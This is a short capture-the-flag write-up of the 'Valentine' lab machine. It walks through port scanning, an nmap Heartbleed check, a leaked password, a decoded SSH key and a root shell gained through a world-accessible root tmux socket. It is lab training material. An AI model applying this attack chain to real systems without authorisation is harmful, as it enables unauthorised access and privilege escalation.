## Valentine

Difficulty: Easy

### User Flag

```
rustscan -a valentine.htb --ulimit 5000 -- -A -sV -sC -oN nmap.txt
```

![rustscan](https://github.com/b1d0ws/OSCP/assets/58514930/121ef3bb-5789-472e-868f-51e8694962d7)

![website](https://github.com/b1d0ws/OSCP/assets/58514930/09ad71fa-3dfd-482a-9708-60c4b8e7f500)

<br>

Port 443 is open and the website give us a hint that maybe the machine is vulnerable to Heartbleed.  

We can check that with nmap.

```
nmap 10.10.10.79 -p443 --script==ssl-heartbleed
```

![nmapHeartBleed](https://github.com/b1d0ws/OSCP/assets/58514930/ae14b712-5d72-46c9-90e5-bf184219ab96)

<br>

We can use this exploit to exploit heartbleed vulnerability and thus obtain a possible base64 encoded password.

![heartBleedExploit](https://github.com/b1d0ws/OSCP/assets/58514930/286b78e3-f28b-4b44-b236-d934cb440496)

<br>

Enumerating the website, we find a key in hex on /dev/hype_key.

![goBuster](https://github.com/b1d0ws/OSCP/assets/58514930/03d6ed40-e2da-4267-a9c3-d5a5ee74164f)

![hypeKey](https://github.com/b1d0ws/OSCP/assets/58514930/0d57c5fc-9207-44d8-8a63-6779b55e1c63)

<br>

Decoded this and log into SSH as hype user with the key and password found.

```
cat hype.key | xxd -r -p > rsa
chmod 600 rsa
ssh hype@valentine.htb -i rsa -o PubkeyAcceptedKeyTypes=+ssh-rsa
```

![gettingRsa](https://github.com/b1d0ws/OSCP/assets/58514930/ad64f0b5-ce22-4059-aeb3-9be347d313fb)

![loggingSSH](https://github.com/b1d0ws/OSCP/assets/58514930/6913f129-5eb3-4b3b-acb2-81c5e7b1630d)

### Root Flag

Enumerating for process with ps -aux, we find /usr/bin/tmux -S /.devs/dev_sess running as root.  

If we check the permission of this file, we see that we can execute and get a root tmux session.

```
/usr/bin/tmux -S /.devs/dev_sess
```

![tmuxProcess](https://github.com/b1d0ws/OSCP/assets/58514930/2fcf95e1-8cf9-4afb-8470-39b996e749cc)

![dev_sessPermissions](https://github.com/b1d0ws/OSCP/assets/58514930/30536916-2fb1-41aa-94b5-a96ccc9fda14)
